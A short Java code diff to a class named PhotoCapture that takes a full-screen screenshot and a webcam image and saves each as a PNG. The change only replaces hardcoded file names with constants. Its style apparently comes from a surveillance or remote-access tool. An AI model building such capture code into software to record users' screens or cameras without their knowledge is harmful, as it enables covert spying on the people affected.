@@ -13,7 +13,7 @@ public class PhotoCapture {
 		try {
 			Robot r = new Robot();
 			BufferedImage screenshot = r.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
-			ImageIO.write(screenshot, "PNG", new File("tempscreenshot.png"));
+			ImageIO.write(screenshot, "PNG", new File(Constants.tempscreen));
 		} catch (Exception e) {
 			System.out.println("[-] Screenshot error");
 		}
@@ -25,7 +25,7 @@ public class PhotoCapture {
 			Webcam w = Webcam.getDefault();
 			w.open();
 			BufferedImage camerashot = w.getImage();
-			ImageIO.write(camerashot, "PNG", new File("tempcamerashot.png"));
+			ImageIO.write(camerashot, "PNG", new File(Constants.tempcamera));
 			w.close();
 		} catch (Exception e) {
 			System.out.println("[-] Camera shot error");
